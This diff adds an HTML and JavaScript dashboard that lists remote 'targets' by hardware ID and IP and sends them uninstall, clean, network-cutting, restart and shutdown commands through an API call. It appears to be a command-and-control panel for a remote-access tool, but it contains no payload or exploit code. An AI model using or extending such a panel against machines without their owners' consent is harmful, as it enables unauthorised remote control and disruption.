@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>VIP Enterprise Command Center</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-base: #090d16;
+            --bg-card: #111827;
+            --border-color: #1f2937;
+            --accent-glow: rgba(56, 189, 248, 0.15);
+            --text-main: #f9fafb;
+            --text-muted: #9ca3af;
+            --primary: #38bdf8;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background-color: var(--bg-base); color: var(--text-main); font-family: 'Inter', sans-serif; padding: 30px; }
+        
+        .dashboard-container { max-width: 1400px; margin: 0 auto; }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            padding: 20px 30px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        .brand { display: flex; align-items: center; gap: 12px; }
+        .brand h1 { font-size: 20px; font-weight: 700; letter-spacing: 0.5px; color: var(--text-main); }
+        .brand span { color: var(--primary); font-family: 'JetBrains Mono', monospace; font-size: 12px; background: rgba(56,189,248,0.1); padding: 4px 8px; border-radius: 4px; }
+        
+        .search-box { flex-grow: 1; max-width: 400px; }
+        .search-box input {
+            width: 100%;
+            background: var(--bg-base);
+            border: 1px solid var(--border-color);
+            padding: 10px 15px;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 13px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .search-box input:focus { border-color: var(--primary); }
+
+        .global-metrics { display: flex; gap: 20px; }
+        .metric-box { background: var(--bg-base); border: 1px solid var(--border-color); padding: 10px 20px; border-radius: 8px; text-align: right; }
+        .metric-box .label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; }
+        .metric-box .value { font-size: 18px; font-weight: 700; font-family: 'JetBrains Mono', monospace; color: var(--primary); }
+
+        .targets-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 24px; }
+
+        .target-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 24px;
+            position: relative;
+            transition: all 0.25s ease;
+            box-shadow: 0 10px 30px -10px rgba(0,0,0,0.3);
+        }
+        .target-card:hover { border-color: rgba(56, 189, 248, 0.4); box-shadow: 0 10px 30px -5px var(--accent-glow); }
+
+        .card-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 18px; padding-bottom: 12px; border-bottom: 1px solid var(--border-color); }
+        .target-identity .name { font-weight: 600; font-size: 16px; color: #fff; margin-bottom: 4px; }
+        .target-identity .hwid { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-muted); }
+
+        .status-badge { font-size: 11px; font-weight: 600; padding: 5px 12px; border-radius: 20px; display: inline-flex; align-items: center; gap: 6px; font-family: 'JetBrains Mono', monospace; }
+        .status-online { background: rgba(34, 197, 94, 0.1); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.2); }
+        .status-offline { background: rgba(239, 68, 68, 0.1); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.2); }
+        .status-dot { width: 6px; height: 6px; border-radius: 50%; background: currentColor; box-shadow: 0 0 8px currentColor; }
+
+        .telemetry-box { background: var(--bg-base); border-radius: 8px; padding: 12px; margin-bottom: 20px; font-family: 'JetBrains Mono', monospace; font-size: 12px; display: flex; flex-direction: column; gap: 6px; }
+        .telemetry-row { display: flex; justify-content: space-between; color: var(--text-muted); }
+        .telemetry-row span { color: var(--text-main); }
+
+        .action-group { margin-bottom: 14px; }
+        .group-title { font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); margin-bottom: 8px; }
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+        .btn-grid.single { grid-template-columns: 1fr; }
+
+        .cmd-btn {
+            background: var(--bg-base);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 10px 14px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+        .cmd-btn:hover { background: #1e293b; border-color: var(--primary); color: #fff; }
+        
+        .btn-warning { border-color: rgba(234, 179, 8, 0.3); color: #facc15; }
+        .btn-warning:hover { background: rgba(234, 179, 8, 0.15); border-color: #facc15; }
+
+        .btn-danger { border-color: rgba(239, 68, 68, 0.3); color: #f87171; }
+        .btn-danger:hover { background: rgba(239, 68, 68, 0.15); border-color: #f87171; }
+
+        .btn-accent { border-color: rgba(168, 85, 247, 0.3); color: #c084fc; }
+        .btn-accent:hover { background: rgba(168, 85, 247, 0.15); border-color: #c084fc; }
+
+        .console-output {
+            background: #020617;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 10px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--primary);
+            margin-top: 15px;
+            min-height: 35px;
+            max-height: 80px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="dashboard-container">
+        <header>
+            <div class="brand">
+                <h1>VIP COMMAND</h1>
+                <span>SOC v2.5</span>
+            </div>
+            
+            <div class="search-box">
+                <input type="text" id="search-input" placeholder="Filter by HWID or IP address..." onkeyup="filterTargets()">
+            </div>
+
+            <div class="global-metrics">
+                <div class="metric-box">
+                    <div class="label">Total Nodes</div>
+                    <div class="value" id="active-count">1</div>
+                </div>
+            </div>
+        </header>
+
+        <div class="targets-grid" id="targets-container">
+            <!-- Target Card Sample -->
+            <div class="target-card" data-identifier="client_alpha a98f-3321-b789 192.168.1.105">
+                <div class="card-header">
+                    <div class="target-identity">
+                        <div class="name">Client_Alpha</div>
+                        <div class="hwid">HWID: A98F-3321-B789</div>
+                    </div>
+                    <div class="status-badge status-online">
+                        <div class="status-dot"></div> ONLINE
+                    </div>
+                </div>
+
+                <div class="telemetry-box">
+                    <div class="telemetry-row">IP Address: <span>192.168.1.105</span></div>
+                    <div class="telemetry-row">Status Scope: <span>Monitored Live</span></div>
+                </div>
+
+                <div class="action-group">
+                    <div class="group-title">Maintenance & Cleanup</div>
+                    <div class="btn-grid">
+                        <button class="cmd-btn btn-warning" onclick="sendAction('A98F-3321-B789', 'uninstall')">⚡ Uninstaller</button>
+                        <button class="cmd-btn btn-warning" onclick="sendAction('A98F-3321-B789', 'clean')">🧹 Deep Clean</button>
+                    </div>
+                </div>
+
+                <div class="action-group">
+                    <div class="group-title">Network Subsystem</div>
+                    <div class="btn-grid">
+                        <button class="cmd-btn btn-accent" onclick="sendAction('A98F-3321-B789', 'netcrash')">🌐 Sever Net</button>
+                        <button class="cmd-btn" onclick="sendAction('A98F-3321-B789', 'netrestore')">🔌 Restore Net</button>
+                    </div>
+                </div>
+
+                <div class="action-group">
+                    <div class="group-title">System Power Control</div>
+                    <div class="btn-grid">
+                        <button class="cmd-btn btn-danger" onclick="sendAction('A98F-3321-B789', 'restart')">🔄 Restart</button>
+                        <button class="cmd-btn btn-danger" onclick="sendAction('A98F-3321-B789', 'shutdown')">🛑 Shutdown</button>
+                    </div>
+                </div>
+
+                <div class="console-output" id="log-A98F-3321-B789">> System ready. Live telemetry active...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function filterTargets() {
+            const query = document.getElementById('search-input').value.toLowerCase();
+            const cards = document.querySelectorAll('.target-card');
+            
+            cards.forEach(card => {
+                const dataAttr = card.getAttribute('data-identifier').toLowerCase();
+                if (dataAttr.includes(query)) {
+                    card.style.display = "block";
+                } else {
+                    card.style.display = "none";
+                }
+            });
+        }
+
+        function sendAction(hwid, action) {
+            const consoleBox = document.getElementById('log-' + hwid);
+            consoleBox.innerText = `> Dispatching directive [${action.toUpperCase()}]...`;
+
+            fetch('/api/target-action', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ hwid: hwid, action: action })
+            })
+            .then(res => res.json())
+            .then(data => {
+                consoleBox.innerText = `> Response: ${data.message}`;
+            })
+            .catch(err => {
+                consoleBox.innerText = `> Error: Transmission timeout.`;
+            });
+        }
+    </script>
+</body>
+</html>
